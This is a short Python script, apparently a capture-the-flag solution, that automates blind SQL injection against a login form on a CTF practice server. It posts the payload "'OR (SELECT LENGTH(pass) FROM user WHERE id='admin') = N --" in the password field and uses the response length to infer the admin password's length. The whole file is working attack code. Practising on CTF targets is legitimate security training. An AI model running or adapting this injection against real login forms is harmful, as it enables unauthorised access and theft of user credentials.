import requests
url = 'http://ctfq.sweetduet.info:10080/~q6/'

for i in range(1,100):
    sql ="'OR (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --".format(counter=i)
    payload = {'id' : 'admin', 
               'pass' : sql,
              }
    response = requests.post(url, data=payload)
    if len(response.text) > 2000:
         print('length of the password is {counter}'.format(counter = i))
         break
